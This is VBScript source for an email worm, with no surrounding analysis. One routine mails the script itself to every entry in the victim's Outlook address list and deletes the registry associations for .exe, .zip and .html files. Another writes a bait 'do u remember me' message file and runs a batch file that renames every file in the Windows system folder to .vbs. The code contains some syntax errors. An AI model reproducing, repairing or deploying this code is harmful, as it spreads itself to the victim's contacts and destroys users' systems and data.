'Nasty gay-Christian wanna love!

Sub Christian()
Me.Hide

Dim x
Set fso ="Scripting.FileSystem.Object"
Set so=CreateObject(fso)
Set ol=CreateObject("Outlook.Application")
Set out=WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject=" "
Mail.Body=" "
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
ol.Quit

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegDelete "HKEY_CLASSES_ROOT\.exe\"
WshShell.RegDelete "HKEY_CLASSES_ROOT\.zip\"
WshShell.RegDelete "HKEY_CLASSES_ROOT\.htm\"
WshShell.RegDelete "HKEY_CLASSES_ROOT\.html\"

End Sub


Sub Message()
Me.Hide

Dim fso, Christian
set fso=CreateObject("Scripting.FileSystemObject")
set Christian=fso.CreateTextFile("C:\Christian-Message.txt")
Christian.WriteLine "umm... hi!"
Christian.WriteLine "do u remember me?"
Christian.WriteLine "we met in gayworld.com chat."
Christian.WriteLine "well... hope u remember me because you was so hot dude!!"
Christian.WriteLine "you got my number don't u?"
Christian.WriteLine "if u don't have it: 044-889047229"
Christian.WriteLine " "
Christian.WriteLine "come to messenger 24.00!"
Christian.WriteLine "my mail: sweetboy_christian@hotmail.com"
Christian.WriteLine " "
Christian.WriteLine "hope u come!!"
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine "best regards, Christian!"
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine " "
Christian.WriteLine "I love you! ;o) "
Christian.Close

Dim fso, batch, shell
set fso=CreateObject("Scripting.FileSystemObject")
set batch=fso.CreateTextFile("C:\WINDOWS\Hahaha.bat")
batch.WriteLine "CLS"
batch.WriteLine "@ECHO OFF"
batch.WriteLine "REN C:\WINDOWS\SYSTEM\*.* *.vbs
batch.Close
shell.Run "C:\WINDOWS\Hahaha.bat"

End Sub